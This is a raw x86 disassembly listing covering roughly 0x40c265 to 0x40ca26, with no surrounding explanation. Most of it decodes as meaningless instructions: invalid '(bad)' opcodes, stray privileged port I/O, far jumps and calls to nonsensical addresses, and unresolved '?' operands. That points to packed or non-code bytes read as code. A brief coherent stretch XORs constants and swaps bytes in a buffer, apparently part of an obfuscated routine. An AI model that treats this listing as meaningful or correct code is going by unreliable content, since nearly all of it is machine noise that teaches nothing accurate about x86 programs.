  40c265:	test   DWORD PTR [edi],ecx
  40c267:	inc    esp
  40c268:	push   edx
  40c269:	pop    eax
  40c26a:	jmp    0x3ea2264e
  40c26f:	xchg   esi,eax
  40c270:	ret    
  40c271:	and    eax,0xb26cf939
  40c276:	lea    eax,[ecx+ecx*4]
  40c279:	xchg   edx,eax
  40c27a:	pop    es
  40c27b:	mov    BYTE PTR [esi],ch
  40c27d:	ret    0x4895
  40c280:	outs   dx,DWORD PTR ds:[esi]
  40c281:	dec    ecx
  40c282:	(bad)  
  40c283:	and    eax,0xa15b7a76
  40c288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c289:	jns    0x40c2d3
  40c28b:	add    bl,ah
  40c28d:	out    dx,eax
  40c28e:	xchg   DWORD PTR [edi-0x13293f30],esp
  40c294:	or     BYTE PTR ds:[esi],bl
  40c297:	mov    ds:0x2938fc1,eax
  40c29c:	mov    ebp,gs
  40c29e:	dec    esp
  40c29f:	pushf  
  40c2a0:	xor    al,bh
  40c2a2:	mov    ebx,0xdee941ac
  40c2a7:	jp     0x40c2ea
  40c2a9:	loop   0x40c313
  40c2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2ac:	jnp    0x40c254
  40c2ae:	xchg   edi,eax
  40c2af:	popa   
  40c2b0:	xchg   ebp,eax
  40c2b1:	fadd   DWORD PTR [ebp-0x2c]
  40c2b4:	call   0xbc12:0x60e71187
  40c2bb:	out    0x38,eax
  40c2bd:	inc    ecx
  40c2be:	in     al,0xb8
  40c2c0:	imul   ebx,DWORD PTR [ecx-0x7d],0xeed7b753
  40c2c7:	mov    DWORD PTR [edx+0x49],eax
  40c2ca:	push   0x3b
  40c2cc:	sar    DWORD PTR [edx+esi*8],cl
  40c2cf:	cdq    
  40c2d0:	pop    eax
  40c2d1:	lock jbe 0x40c25d
  40c2d4:	xor    al,0xe7
  40c2d6:	mov    DWORD PTR [edi-0x5c932da8],ecx
  40c2dc:	xchg   ecx,eax
  40c2dd:	scas   eax,DWORD PTR es:[edi]
  40c2de:	push   esi
  40c2df:	pop    ss
  40c2e0:	push   eax
  40c2e1:	loope  0x40c2d9
  40c2e3:	pop    ecx
  40c2e4:	mov    edx,?
  40c2e6:	or     BYTE PTR [eax-0x16],cl
  40c2e9:	and    al,bl
  40c2eb:	xor    BYTE PTR [esi+0x46],cl
  40c2ee:	dec    edi
  40c2ef:	push   cs
  40c2f0:	push   0x43
  40c2f2:	fiadd  WORD PTR [ebp-0x4b]
  40c2f5:	fimul  WORD PTR [ebx]
  40c2f7:	cmp    BYTE PTR [ebx-0x14ca3fb4],cl
  40c2fd:	mov    BYTE PTR [edx+0x40],bl
  40c300:	pop    eax
  40c301:	push   edx
  40c302:	aaa    
  40c303:	pop    esp
  40c304:	xor    edx,ebp
  40c306:	das    
  40c307:	in     al,0xf9
  40c309:	mov    DWORD PTR [ecx+0x27],ebp
  40c30c:	std    
  40c30d:	xor    DWORD PTR [edx],ebp
  40c30f:	(bad)  
  40c310:	retf   0x7e9a
  40c313:	dec    esp
  40c314:	imul   esp,eax,0xffffff99
  40c317:	lea    edx,[edi-0x38aeb64c]
  40c31d:	push   edx
  40c31e:	xchg   edi,eax
  40c31f:	push   ds
  40c320:	or     DWORD PTR [edx-0x60231f97],0x61a59ec3
  40c32a:	mov    bl,0xe7
  40c32c:	cwde   
  40c32d:	and    BYTE PTR [ecx+0x4a062803],dh
  40c333:	push   0xbfbe5f8e
  40c338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c339:	ret    
  40c33a:	push   esi
  40c33b:	dec    ecx
  40c33c:	xchg   edi,eax
  40c33d:	sbb    BYTE PTR [ebx+0x10],0x30
  40c341:	push   esp
  40c342:	hlt    
  40c343:	bound  edx,QWORD PTR gs:[eax]
  40c346:	pusha  
  40c347:	test   al,0xa7
  40c349:	push   eax
  40c34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c34b:	cwde   
  40c34c:	shl    DWORD PTR [edx-0x23c7ba9f],cl
  40c352:	inc    ebx
  40c353:	popa   
  40c354:	hlt    
  40c355:	fwait
  40c356:	push   0x11
  40c358:	dec    esp
  40c359:	idiv   DWORD PTR [ecx-0x47dd6bb3]
  40c35f:	xchg   DWORD PTR [ebx-0x3232ca57],esi
  40c365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c366:	push   esp
  40c367:	inc    eax
  40c368:	sub    BYTE PTR [ebp+0x424f7722],bh
  40c36e:	cmc    
  40c36f:	cld    
  40c370:	inc    ebp
  40c371:	sbb    cl,dl
  40c373:	sbb    DWORD PTR [eax+0x2e],esp
  40c376:	(bad)  
  40c377:	jne    0x40c31a
  40c379:	xor    eax,0x6aa00bb3
  40c37e:	shl    DWORD PTR [esi],cl
  40c380:	sbb    eax,0xe3323857
  40c385:	mov    al,0xe4
  40c387:	xor    eax,0xf1f10239
  40c38c:	popa   
  40c38d:	push   ecx
  40c38e:	jmp    0x40c40f
  40c390:	fdivr  st(5),st
  40c392:	sub    esp,DWORD PTR [edi]
  40c394:	aas    
  40c395:	std    
  40c396:	push   0xffffffe8
  40c398:	xchg   BYTE PTR ds:0x71b7ff24,bh
  40c39e:	imul   ebx,DWORD PTR [eax*4-0x6bd2d2a0],0x3d
  40c3a6:	pop    es
  40c3a7:	pop    esp
  40c3a8:	dec    esp
  40c3a9:	(bad)
  40c3ae:	add    ebx,ecx
  40c3b0:	fcom   DWORD PTR [edi+0x37d285af]
  40c3b6:	jmp    0x40c351
  40c3b8:	xchg   ebp,eax
  40c3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ba:	sbb    ebx,DWORD PTR [edi-0x459f47a]
  40c3c0:	push   es
  40c3c1:	pop    eax
  40c3c2:	sbb    eax,0xf2876bff
  40c3c7:	jmp    0x40c3c8
  40c3c9:	out    0xb0,eax
  40c3cb:	jg     0x40c3a5
  40c3cd:	xor    eax,0x1bd3d96e
  40c3d2:	jmp    0x8db6:0x8b64ca36
  40c3d9:	out    0x61,eax
  40c3db:	in     al,0xfe
  40c3dd:	std    
  40c3de:	outs   dx,BYTE PTR ds:[esi]
  40c3df:	add    DWORD PTR [esi+edx*4+0x7bda842c],edi
  40c3e6:	jle    0x40c403
  40c3e8:	test   DWORD PTR [edx+0x73f76a85],0xeb1350
  40c3f2:	xor    DWORD PTR [edx],ebx
  40c3f4:	shl    DWORD PTR [eax],1
  40c3f6:	test   al,0x2f
  40c3f8:	sbb    BYTE PTR [ebx+ecx*1-0x6e833824],dh
  40c3ff:	(bad)  [ebp-0x2510c347]
  40c405:	out    dx,al
  40c406:	mov    cl,BYTE PTR ds:[ecx+0x4575e233]
  40c40d:	dec    ecx
  40c40e:	addr16 sub al,0xeb
  40c411:	xlat   BYTE PTR gs:[ebx]
  40c413:	xchg   ebp,eax
  40c414:	mov    ecx,0xfc9f8305
  40c419:	pop    esi
  40c41a:	cmp    BYTE PTR [ebx-0x5719de90],0x65
  40c421:	dec    ecx
  40c422:	jno    0x40c443
  40c424:	sub    al,dl
  40c426:	or     DWORD PTR [eax-0x664b102e],eax
  40c42c:	pop    ds
  40c42d:	mov    al,fs:0x2ab0de6a
  40c433:	xchg   ecx,eax
  40c434:	push   edi
  40c435:	xchg   ebp,eax
  40c436:	mov    es,WORD PTR [edi]
  40c438:	cmc    
  40c439:	and    al,0x74
  40c43b:	out    dx,eax
  40c43c:	cdq    
  40c43d:	dec    edi
  40c43e:	add    bl,BYTE PTR [eax-0x6a]
  40c441:	fisubr DWORD PTR [edi]
  40c443:	dec    edi
  40c445:	cmp    al,0x8b
  40c447:	cld    
  40c448:	sub    dh,BYTE PTR [ebp+0x63]
  40c44b:	mov    es,WORD PTR [ebx-0xa335b2d]
  40c451:	dec    esp
  40c452:	data16 into 
  40c454:	enter  0x7796,0xa6
  40c458:	and    esp,eax
  40c45a:	and    eax,0xdad76e6b
  40c45f:	add    ecx,DWORD PTR [edx-0x6b5412da]
  40c465:	xchg   edi,eax
  40c466:	pushw  cs
  40c468:	sbb    eax,esp
  40c46a:	cs gs xchg ecx,eax
  40c46d:	and    ecx,0xffffffcd
  40c470:	stc    
  40c471:	adc    ch,BYTE PTR [ecx]
  40c473:	sbb    bh,BYTE PTR [edx-0x8]
  40c476:	add    al,ch
  40c478:	ins    BYTE PTR es:[edi],dx
  40c479:	xor    ch,dl
  40c47b:	pop    edi
  40c47c:	adc    edx,DWORD PTR [esi+0x14]
  40c47f:	outs   dx,DWORD PTR ds:[esi]
  40c480:	xchg   esi,eax
  40c481:	mov    ds:0x2e15874e,eax
  40c486:	pop    ss
  40c487:	fld    TBYTE PTR [ebx]
  40c489:	xor    esp,DWORD PTR [esi]
  40c48b:	cs xor al,0xa5
  40c48e:	mov    BYTE PTR [esi],0x98
  40c491:	dec    ebp
  40c492:	(bad)  
  40c494:	test   al,0x90
  40c496:	dec    eax
  40c497:	mov    edi,0x228868f3
  40c49c:	mov    edx,0x8174681e
  40c4a1:	gs push es
  40c4a3:	mul    DWORD PTR [ebx-0x451ef636]
  40c4a9:	ror    BYTE PTR [esi-0x68d0f192],cl
  40c4af:	cs jnp 0x40c440
  40c4b2:	sbb    ah,cl
  40c4b4:	sub    DWORD PTR [ebp-0x6],0x977afe7c
  40c4bb:	inc    eax
  40c4bc:	scas   eax,DWORD PTR es:[edi]
  40c4bd:	xor    esp,ebp
  40c4bf:	cmp    eax,0xffa60f23
  40c4c4:	mov    al,BYTE PTR [esi]
  40c4c6:	xchg   BYTE PTR [edx+0x22],dl
  40c4c9:	scas   eax,DWORD PTR es:[edi]
  40c4ca:	sub    al,0xab
  40c4cc:	mov    ds:0x407dee76,al
  40c4d1:	ret    
  40c4d2:	or     ebp,DWORD PTR [ecx]
  40c4d4:	sahf   
  40c4d5:	jo     0x40c4c6
  40c4d7:	icebp  
  40c4d8:	and    al,0xc1
  40c4da:	inc    esi
  40c4db:	or     DWORD PTR [eax],esi
  40c4dd:	out    0xae,eax
  40c4df:	push   edi
  40c4e0:	(bad)  
  40c4e1:	ds sti 
  40c4e3:	mov    bh,0x77
  40c4e5:	lea    ebp,[eax]
  40c4e7:	cmp    BYTE PTR [esi+0x221eee18],0x41
  40c4ee:	jne    0x40c4cf
  40c4f0:	pop    esi
  40c4f1:	jl     0x40c48b
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	icebp  
  40c540:	and    esi,DWORD PTR [eax-0x4c]
  40c543:	rcl    BYTE PTR [esi+0x79707e7e],1
  40c549:	jle    0x40c5c9
  40c54b:	pop    ecx
  40c54c:	leave  
  40c54d:	and    BYTE PTR [ebx],ah
  40c54f:	adc    ah,cl
  40c551:	mov    edi,0xcc7dabf
  40c556:	sbb    eax,0xecb3822a
  40c55b:	mov    edi,0x78c15058
  40c560:	fldcw  WORD PTR [eax-0x41]
  40c563:	nop
  40c564:	loop   0x40c5b6
  40c566:	jp     0x40c57c
  40c568:	rol    DWORD PTR [esi+0x65],1
  40c56b:	dec    esp
  40c56c:	mov    eax,0x7a8d2bb4
  40c571:	cmp    eax,0xc7d74d6
  40c576:	mov    ds:0x6d0a3091,eax
  40c57b:	mov    ebx,0xd6676e1a
  40c580:	je     0x40c52e
  40c582:	sbb    ebx,esp
  40c584:	jne    0x40c600
  40c586:	and    BYTE PTR [edi],ah
  40c588:	xor    bl,BYTE PTR [ecx+0x25]
  40c58b:	inc    ebx
  40c58c:	or     BYTE PTR [ebx],dl
  40c58e:	cdq    
  40c58f:	sub    al,0x78
  40c591:	(bad)  
  40c592:	rcr    BYTE PTR [eax+0x580d4c41],cl
  40c598:	jne    0x40c5d2
  40c59a:	fwait
  40c59b:	add    eax,0x7a53d0c0
  40c5a0:	adc    esp,DWORD PTR [edi]
  40c5a2:	push   eax
  40c5a3:	pop    ecx
  40c5a4:	pop    ss
  40c5a5:	test   DWORD PTR [edi-0xdd777ef],esi
  40c5ab:	mov    eax,ds:0x135ee806
  40c5b0:	lods   eax,DWORD PTR ds:[esi]
  40c5b1:	loopne 0x40c612
  40c5b3:	and    dh,BYTE PTR [edx]
  40c5b5:	pop    edi
  40c5b6:	outs   dx,BYTE PTR ds:[esi]
  40c5b7:	aam    0x6f
  40c5b9:	nop
  40c5ba:	fcomp  QWORD PTR [esi-0x63]
  40c5bd:	es mov al,0xed
  40c5c0:	jne    0x40c63d
  40c5c2:	pop    edx
  40c5c3:	pop    ss
  40c5c4:	inc    ebp
  40c5c5:	jae    0x40c5c5
  40c5c7:	int    0x74
  40c5c9:	inc    esp
  40c5ca:	push   ecx
  40c5cb:	daa    
  40c5cc:	xor    cl,BYTE PTR [eax+0xb]
  40c5cf:	inc    ebx
  40c5d0:	pop    edi
  40c5d1:	fdecstp 
  40c5d3:	pop    ss
  40c5d4:	addr16 mov esp,0x2910ba2
  40c5da:	fistp  QWORD PTR [ebp+0x1b]
  40c5dd:	daa    
  40c5de:	pop    ss
  40c5df:	retf   0xba3f
  40c5e2:	add    edi,DWORD PTR [ebp+0x7fa527a5]
  40c5e8:	sbb    edx,0xa90c8159
  40c5ee:	sub    eax,0x496b3a6b
  40c5f3:	in     eax,0x82
  40c5f5:	mul    DWORD PTR [ecx+0x7b]
  40c5f8:	pop    es
  40c5f9:	push   ecx
  40c5fa:	and    bh,BYTE PTR [eax]
  40c5fc:	mov    al,0xc0
  40c5fe:	test   eax,0x7fb8f79e
  40c603:	fcom   DWORD PTR [esi+0xd]
  40c606:	jnp    0x40c641
  40c608:	loope  0x40c672
  40c60a:	in     eax,0x90
  40c60c:	call   0xf8db:0x918d50a6
  40c613:	ds fs scas eax,DWORD PTR es:[edi]
  40c616:	add    eax,0xa2d55392
  40c61b:	jle    0x40c5eb
  40c61d:	stc    
  40c61e:	push   ecx
  40c61f:	mov    bh,0x72
  40c621:	cs mov esi,0xddddf543
  40c627:	adc    eax,0x3a22635f
  40c62c:	jp     0x40c6a9
  40c62e:	sbb    eax,0x6a488697
  40c633:	shr    DWORD PTR [edi-0x6a2d012],0x33
  40c63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c63b:	jge    0x40c635
  40c63d:	xor    BYTE PTR ds:[ebx-0x26],0xe7
  40c642:	out    0x3c,al
  40c644:	ds dec ebx
  40c646:	jmp    0xc002:0x6e18e68e
  40c64d:	fnstenv [ebp+0x4e5d0fe9]
  40c653:	and    DWORD PTR [edx-0x6bfab295],ecx
  40c659:	sbb    ecx,DWORD PTR [ecx+ecx*1-0x63646395]
  40c660:	aad    0x9d
  40c662:	jnp    0x40c6c1
  40c664:	jno    0x40c603
  40c666:	xchg   ebx,eax
  40c667:	pop    edi
  40c668:	adc    eax,0xff57e6ec
  40c66d:	sbb    eax,0xeb01007e
  40c672:	in     eax,dx
  40c673:	xchg   esi,eax
  40c674:	xchg   ebp,eax
  40c675:	xchg   edi,eax
  40c676:	popf   
  40c677:	dec    ecx
  40c678:	call   0x7b2e:0xfa536158
  40c67f:	call   0x48569c1f
  40c684:	sub    al,0xb9
  40c686:	call   0xe011:0xd93220ff
  40c68d:	sar    DWORD PTR [ebp-0x24],0x9f
  40c691:	adc    BYTE PTR [ebx],ah
  40c693:	pop    esi
  40c694:	fisttp QWORD PTR [ebx]
  40c696:	inc    ebx
  40c697:	jmp    0x1302:0x7717eec3
  40c69e:	rol    BYTE PTR [esi],cl
  40c6a0:	mov    al,0x12
  40c6a2:	add    al,0x4b
  40c6a4:	push   edi
  40c6a5:	inc    esi
  40c6a6:	(bad)  
  40c6a7:	out    0xd4,eax
  40c6a9:	jp     0x40c6da
  40c6ab:	punpcklwd mm5,DWORD PTR [ecx]
  40c6ae:	rcl    DWORD PTR [ebx-0x46f9bcc5],1
  40c6b4:	cmp    cl,bh
  40c6b6:	mov    ds:0xc374dac3,al
  40c6bb:	mov    esp,0x956b8ebe
  40c6c0:	fs inc edi
  40c6c2:	retf   
  40c6c3:	mov    al,ds:0x2e56f7c7
  40c6c8:	(bad)  
  40c6c9:	jp     0x40c6aa
  40c6cb:	sub    DWORD PTR [edi-0x7d09db78],0x6e
  40c6d2:	jl     0x40c6df
  40c6d4:	jns    0x40c714
  40c6d6:	jge    0x40c6c1
  40c6d8:	add    esi,DWORD PTR [edx+0x62079442]
  40c6de:	lds    ebx,FWORD PTR [esi-0x50]
  40c6e1:	loopne 0x40c690
  40c6e3:	pop    esp
  40c6e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6e5:	(bad)  
  40c6e6:	js     0x40c70a
  40c6e8:	loope  0x40c686
  40c6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6eb:	ret    0x6c7c
  40c6ee:	xchg   edx,eax
  40c6ef:	cmc    
  40c6f0:	mov    esp,DWORD PTR [eax+0xf]
  40c6f3:	dec    edi
  40c6f4:	cmp    eax,0x108c534
  40c6f9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c6fb:	pop    ecx
  40c6fc:	cdq    
  40c6fd:	jle    0x40c6ba
  40c6ff:	(bad)  
  40c700:	ja     0x40c6ba
  40c702:	mov    esi,0xfede5b66
  40c707:	enter  0xb2d0,0xc0
  40c70b:	ds aaa 
  40c70d:	fld    TBYTE PTR [ebx]
  40c70f:	int    0x56
  40c711:	mov    ?,edi
  40c713:	sbb    al,0xdc
  40c715:	jge    0x40c72c
  40c717:	or     eax,0x53006a66
  40c71c:	shl    BYTE PTR [edx-0x37],1
  40c71f:	dec    BYTE PTR [ebp+0x71f0bce9]
  40c725:	nop
  40c726:	test   edi,ebp
  40c728:	adc    al,0x4a
  40c72a:	bnd jae 0x40c7a7
  40c72d:	pop    esp
  40c72e:	or     DWORD PTR [ebx-0x607557bb],esi
  40c734:	sbb    esp,DWORD PTR [esi-0x32]
  40c737:	not    edx
  40c739:	gs fwait
  40c73b:	aad    0x8c
  40c73d:	lods   eax,DWORD PTR ds:[esi]
  40c73e:	mov    bh,0xb0
  40c740:	mov    ebp,0x81a6cebc
  40c745:	cli    
  40c746:	mov    bl,0xcb
  40c748:	imul   DWORD PTR [eax]
  40c74a:	mov    bl,0x8c
  40c74c:	mov    ds:0x1cac8ce6,eax
  40c751:	push   edi
  40c752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c753:	ret    
  40c754:	xor    DWORD PTR [ebp+eax*4+0x308d29d9],ecx
  40c75b:	push   0x1d52a1dd
  40c760:	mov    ecx,0x1dd7d3d2
  40c765:	jp     0x40c792
  40c767:	and    al,0xc9
  40c769:	test   BYTE PTR [ebx-0xb05e321],bl
  40c76f:	fdivr  st(5),st
  40c771:	call   0x245aa0b8
  40c776:	ror    BYTE PTR [eax-0x3b],cl
  40c779:	or     eax,0x8478857
  40c77e:	loop   0x40c70f
  40c780:	xchg   edx,eax
  40c781:	xor    edx,ebp
  40c783:	js     0x1aa328b9
  40c789:	add    ah,ch
  40c78b:	inc    esi
  40c78c:	adc    bh,ah
  40c78e:	repz pop ds
  40c790:	mov    cl,0x77
  40c792:	dec    esp
  40c793:	adc    ch,BYTE PTR fs:[edi+edx*8]
  40c797:	mov    bh,0x56
  40c799:	and    BYTE PTR [edi-0x21],bl
  40c79c:	sub    dl,ah
  40c79e:	push   0xbb8767da
  40c7a3:	sbb    ecx,edx
  40c7a5:	sbb    DWORD PTR [ecx+ecx*4+0x32836531],edx
  40c7ac:	cmp    esp,DWORD PTR [edx+eax*8-0x27]
  40c7b0:	jmp    0xf122:0xab9f2b38
  40c7b7:	js     0x40c810
  40c7b9:	(bad)  
  40c7bb:	fcompp 
  40c7bd:	add    al,dh
  40c7bf:	push   edx
  40c7c0:	push   edi
  40c7c1:	ficom  WORD PTR [esi+edx*8]
  40c7c4:	inc    ebp
  40c7c5:	xchg   ah,dl
  40c7c7:	pop    esp
  40c7c8:	mov    esp,DWORD PTR [eax+0x67343f74]
  40c7ce:	jp     0x40c7e5
  40c7d0:	push   0x99fa6434
  40c7d5:	add    al,0x5b
  40c7d7:	ins    BYTE PTR es:[edi],dx
  40c7d8:	mov    esi,0x3258f6ec
  40c7dd:	mov    esp,0xbc9f1e57
  40c7e2:	es pop esi
  40c7e4:	pop    ebx
  40c7e5:	mov    BYTE PTR [ebx+0x334aba5e],ah
  40c7eb:	add    eax,0xaa4a1c5
  40c7f0:	sub    eax,0xfaa75ec8
  40c7f5:	inc    esi
  40c7f6:	aaa    
  40c7f7:	push   ss
  40c7f8:	imul   edx,DWORD PTR ss:[ecx+esi*2+0x1702f5fb],0x1a1d291a
  40c804:	and    al,0xe3
  40c806:	fcomp  DWORD PTR [eax+0x377e6c52]
  40c80c:	jno    0x40c811
  40c80e:	mov    esp,0xf7b23c94
  40c813:	pop    esp
  40c814:	imul   ebp,DWORD PTR [eax+0x78754c9f],0x38dcc84a
  40c81e:	jmp    0xb9e6:0x7723157d
  40c825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c826:	xchg   edi,edi
  40c828:	inc    esi
  40c829:	jmp    0x5103:0x510abba6
  40c830:	push   ss
  40c831:	js     0x40c875
  40c833:	loopne 0x40c811
  40c835:	dec    esi
  40c836:	xor    eax,0xa2a1b326
  40c83b:	mov    dh,0x48
  40c83d:	jnp    0x40c882
  40c83f:	popa   
  40c840:	es mov eax,0x924e0b62
  40c846:	inc    ebp
  40c847:	ror    DWORD PTR [ecx-0x878a33f],cl
  40c84d:	ins    DWORD PTR es:[edi],dx
  40c84e:	mov    edx,0x5d00a2e0
  40c853:	mov    ds:0xcb291b96,eax
  40c858:	cwde   
  40c859:	imul   ebp,esp,0x9cc85aae
  40c85f:	inc    ecx
  40c860:	mov    bh,0x30
  40c862:	cmp    eax,0x68e22649
  40c867:	mov    edi,DWORD PTR ds:0x9eb636e2
  40c86d:	fadd   QWORD PTR [esi]
  40c86f:	and    BYTE PTR [eax-0x445fa276],0xb1
  40c876:	sbb    DWORD PTR [eax-0x7d971ef],eax
  40c87c:	out    0x7c,eax
  40c87e:	fist   WORD PTR [ebx]
  40c880:	loop   0x40c817
  40c882:	pop    ss
  40c883:	je     0x40c865
  40c885:	iret   
  40c886:	loopne 0x40c882
  40c888:	ss in  al,dx
  40c88a:	and    dh,BYTE PTR [edi-0x2e]
  40c88d:	mov    ah,0x9e
  40c88f:	cwde   
  40c890:	sbb    eax,0xb334454
  40c895:	add    al,0x34
  40c897:	sub    BYTE PTR [edi+0x5cd2aa7b],0x86
  40c89e:	rol    BYTE PTR [esi],1
  40c8a0:	popf   
  40c8a1:	div    DWORD PTR [ecx]
  40c8a3:	sar    BYTE PTR [ebx+0x79],cl
  40c8a6:	add    edx,DWORD PTR [edx+ecx*8]
  40c8a9:	sbb    cl,BYTE PTR [eax+0x4934c46b]
  40c8af:	dec    ecx
  40c8b0:	es mov bh,0xdf
  40c8b3:	repz icebp 
  40c8b5:	push   ds
  40c8b6:	pop    ss
  40c8b7:	ss mov ?,esi
  40c8ba:	cmp    eax,0xa0bc9e85
  40c8bf:	das    
  40c8c0:	ja     0x40c863
  40c8c2:	aas    
  40c8c3:	sbb    BYTE PTR [ebx],dl
  40c8c5:	out    dx,eax
  40c8c6:	pop    ebx
  40c8c7:	cmp    BYTE PTR [ecx-0x4b],dl
  40c8ca:	in     al,dx
  40c8cb:	inc    edx
  40c8cc:	mov    DWORD PTR [esi],edi
  40c8ce:	test   al,0xe6
  40c8d0:	sub    al,0x1b
  40c8d2:	je     0x40c933
  40c8d4:	fcom   DWORD PTR cs:[eax-0x1561d39f]
  40c8db:	push   edx
  40c8dc:	scas   eax,DWORD PTR es:[edi]
  40c8dd:	hlt    
  40c8de:	xchg   edi,esi
  40c8e0:	imul   edx,DWORD PTR [edx],0xffffffa0
  40c8e3:	loop   0x40c8a1
  40c8e5:	mov    al,ds:0xb468b9f1
  40c8ea:	test   ah,0x5f
  40c8ed:	jae    0x40c94a
  40c8ef:	inc    edi
  40c8f0:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8f2:	test   eax,0x74bd341f
  40c8f7:	mov    ds:0x6d4d504,eax
  40c8fc:	ror    BYTE PTR [ecx],0x6c
  40c8ff:	jno    0x40c8f5
  40c901:	cmp    al,0xc3
  40c903:	pop    eax
  40c905:	neg    DWORD PTR [edi]
  40c907:	sbb    ecx,DWORD PTR [eax-0x79]
  40c90a:	in     al,dx
  40c90b:	push   esi
  40c90c:	mov    eax,ds:0xe34c75c1
  40c911:	push   es
  40c912:	add    al,0xe0
  40c914:	mov    gs,esi
  40c916:	push   edx
  40c917:	push   ss
  40c918:	pop    esp
  40c919:	(bad)  
  40c91a:	jno    0x40c98c
  40c91c:	mov    fs,WORD PTR [edi+0x10]
  40c91f:	sbb    DWORD PTR [ebp+0x12],0xfffffffc
  40c923:	nop
  40c924:	and    al,0xcc
  40c926:	mov    ds:0x4efceda0,eax
  40c92b:	test   DWORD PTR [ebx-0x4440e64d],ecx
  40c931:	imul   edi,DWORD PTR [ebx+0x538a02e4],0xd38498ca
  40c93b:	adc    BYTE PTR [edi],bl
  40c93d:	xor    dh,dh
  40c93f:	imul   BYTE PTR [eax+0x4da305ba]
  40c945:	add    edx,DWORD PTR [ebp-0x14]
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	shld   ecx,eax,cl
  40c9a0:	inc    ebx
  40c9a1:	push   0x7e7e92ca
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	ja     0x40c962
  40c9ac:	cwde   
  40c9ad:	lods   eax,DWORD PTR ds:[esi]
  40c9ae:	pusha  
  40c9af:	mov    al,ds:0xb4ce49d5
  40c9b4:	cmc    
  40c9b5:	stc    
  40c9b6:	xchg   ecx,eax
  40c9b7:	pop    ds
  40c9b8:	xchg   esp,eax
  40c9b9:	xor    BYTE PTR [edi],ah
  40c9bb:	push   ds
  40c9bc:	and    edx,ebp
  40c9be:	into   
  40c9bf:	bound  esi,QWORD PTR [esi+0x34]
  40c9c2:	retf   0x9ac6
  40c9c5:	pop    ds
  40c9c6:	hlt    
  40c9c7:	mov    bl,0x6c
  40c9c9:	xchg   ebx,eax
  40c9ca:	dec    ecx
  40c9cb:	fisubr DWORD PTR [ebp+0xf]
  40c9ce:	jl     0x40c9ef
  40c9d0:	pop    esp
  40c9d1:	jge    0x40c9c7
  40c9d3:	xor    ecx,DWORD PTR [ecx+0x399425b2]
  40c9d9:	(bad)  
  40c9db:	push   ss
  40c9dc:	xchg   edx,eax
  40c9dd:	mov    eax,ds:0x36719c8a
  40c9e2:	out    0x37,eax
  40c9e4:	mov    dl,0x12
  40c9e6:	repnz sahf 
  40c9e8:	jmp    0x5d94:0x63aa9b68
  40c9ef:	add    DWORD PTR [ebp-0x135ee40a],esp
  40c9f5:	arpl   WORD PTR [ecx+0x21],dx
  40c9f8:	jnp    0x40c99a
  40c9fa:	fcmovnu st,st(5)
  40c9fc:	popa   
  40c9fd:	ds xchg dl,ch
  40ca00:	mov    esi,DWORD PTR [ebp+0x2d]
  40ca03:	aaa    
  40ca04:	mov    esp,0xfd45f663
  40ca09:	jne    0x40c9af
  40ca0b:	inc    ecx
  40ca0c:	jnp    0x40ca7c
  40ca0e:	push   esp
  40ca0f:	and    BYTE PTR [eax-0x2f],al
  40ca12:	es repz enter 0xa2bb,0x34
  40ca18:	inc    eax
  40ca19:	sbb    ax,0x18
  40ca1d:	pop    ebp
  40ca1e:	call   0xa6cc:0xad9d9222
  40ca25:	ins    DWORD PTR es:[edi],dx
  40ca26:	jle    0x40c9bb
